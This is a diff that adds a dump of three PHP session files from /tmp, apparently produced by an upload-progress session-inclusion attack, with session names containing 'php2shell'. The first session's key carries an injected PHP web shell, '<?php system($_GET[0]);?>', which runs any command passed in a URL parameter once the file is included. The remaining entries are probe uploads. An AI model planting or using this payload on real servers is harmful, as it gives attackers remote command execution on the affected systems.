@@ -1,0 +1,6 @@
+== /tmp/sess_lfie9835ddfa7ab5725f6d3a177
+upload_progress_<?php system($_GET[0]);?>|a:5:{s:10:"start_time";i:1792572558;s:14:"content_length";i:271;s:15:"bytes_processed";i:271;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:1:"f";s:4:"name";s:5:"a.txt";s:8:"tmp_name";s:27:"/tmp/phple6ta9cfucpl7zBf1ty";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792572558;s:15:"bytes_processed";i:1;}}}
+== /tmp/sess_php2shellf4110254a6a1f5851459aba
+upload_progress_x|a:5:{s:10:"start_time";i:1792572558;s:14:"content_length";i:261;s:15:"bytes_processed";i:261;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:1:"f";s:4:"name";s:9:"probe.txt";s:8:"tmp_name";s:27:"/tmp/php7omt755lvqp10ROjYmF";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792572558;s:15:"bytes_processed";i:5;}}}
+== /tmp/sess_php2shell9bfb535c05a6076a940485a
+upload_progress_x|a:5:{s:10:"start_time";i:1792572557;s:14:"content_length";i:67981;s:15:"bytes_processed";i:67981;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:1:"f";s:4:"name";s:1:"a";s:8:"tmp_name";s:27:"/tmp/php0bausl86thd32TOxrtQ";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792572557;s:15:"bytes_processed";i:15554;}}}
